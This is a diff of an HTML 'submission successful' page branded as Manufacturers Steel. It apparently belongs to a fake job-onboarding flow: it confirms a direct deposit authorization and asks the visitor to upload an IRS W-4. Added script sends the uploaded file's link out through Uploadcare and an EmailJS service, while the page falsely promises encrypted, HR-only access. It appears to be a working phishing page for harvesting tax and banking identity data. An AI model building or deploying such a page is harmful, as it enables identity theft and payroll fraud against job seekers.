@@ -3,83 +3,140 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Onboarding Submission Complete</title>
-
-<!-- Uploadcare -->
-<script>
-  UPLOADCARE_PUBLIC_KEY = "7c0fc9909edc9b633c64";
-</script>
-<script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
+<title>Submission Successful | Manufacturers Steel</title>
 
 <style>
 body {
     font-family: Arial, sans-serif;
-    background-color: #f4f6f8;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
+    background:#f4f4f4;
+    margin:0;
+    padding:20px;
 }
 
-.success-box {
-    background: #ffffff;
-    padding: 40px;
-    max-width: 520px;
-    text-align: center;
-    border-radius: 8px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+.container {
+    background:#fff;
+    max-width:700px;
+    margin:auto;
+    padding:30px;
+    border-radius:8px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.1);
+    text-align:center;
 }
 
-h1 { color: #28a745; }
-
-.security {
-    background:#f8f9fa;
-    border-left:4px solid #007bff;
-    padding:15px;
-    font-size:14px;
-    margin:20px 0;
+.success-icon {
+    font-size:48px;
+    color:#28a745;
 }
 
-.small-text {
-    font-size: 14px;
-    color: #666;
+h1 {
+    color:#28a745;
+}
+
+.secure-box {
+    margin-top:30px;
+    padding:20px;
+    border-left:5px solid #007bff;
+    background:#f9f9f9;
+    text-align:left;
+}
+
+button {
+    margin-top:20px;
+    background:#007bff;
+    color:#fff;
+    border:none;
+    padding:12px 20px;
+    font-size:16px;
+    border-radius:5px;
+    cursor:pointer;
+}
+
+button:hover {
+    background:#0056b3;
+}
+
+.footer {
+    margin-top:30px;
+    font-size:13px;
+    color:#666;
 }
 </style>
+
+<!-- Uploadcare -->
+<script>
+UPLOADCARE_PUBLIC_KEY = "7c0fc9909edc9b633c64";
+</script>
+<script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+(function(){
+    emailjs.init("dCnMUwyT-sgO82hae");
+})();
+</script>
 </head>
 
 <body>
 
-<div class="success-box">
-    <h1>✅ Submission Successful</h1>
+<div class="container">
+    <div class="success-icon">✔</div>
+    <h1>Submission Successful</h1>
 
     <p>
         Your <strong>Direct Deposit Authorization</strong> has been securely received.
     </p>
 
-    <div class="security">
-        🔒 <strong>Secure W-4 Upload</strong><br>
-        For security reasons, tax documents are uploaded through an encrypted system.
-        Please upload your completed IRS W-4 form below.
+    <div class="secure-box">
+        <h3>🔒 Secure W-4 Upload</h3>
+        <p>
+            For security reasons, tax documents are uploaded through an encrypted system.
+            Please upload your completed IRS W-4 form below.
+        </p>
+
+        <form id="w4Form">
+            <input
+                type="hidden"
+                role="uploadcare-uploader"
+                name="w4_file"
+                data-clearable
+                data-file-types="pdf"
+                data-max-size="5242880"
+            >
+
+            <button type="submit">Submit W-4 Securely</button>
+        </form>
     </div>
 
-    <input
-      type="hidden"
-      role="uploadcare-uploader"
-      data-clearable
-      data-file-types=".pdf"
-      data-multiple="false"
-      data-max-size="5242880"
-    />
-
-    <p class="small-text">
-        PDF only • Max size 5MB • Files are encrypted and accessible only to HR
-    </p>
-
-    <p class="small-text">
+    <div class="footer">
+        PDF only • Max size 5MB • Files are encrypted and accessible only to HR<br>
         Manufacturers Steel — All information is confidential and used solely for employment purposes.
-    </p>
+    </div>
 </div>
+
+<script>
+document.getElementById("w4Form").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    const fileInput = document.querySelector('[name="w4_file"]');
+    if (!fileInput.value) {
+        alert("Please upload your W-4 PDF before submitting.");
+        return;
+    }
+
+    emailjs.send("service_w8bw8vg", "template_i7oa7kg", {
+        w4_file_link: fileInput.value,
+        document_type: "IRS W-4"
+    }).then(
+        function() {
+            alert("Your W-4 has been securely submitted. Thank you!");
+        },
+        function() {
+            alert("Submission failed. Please try again.");
+        }
+    );
+});
+</script>
 
 </body>
 </html>
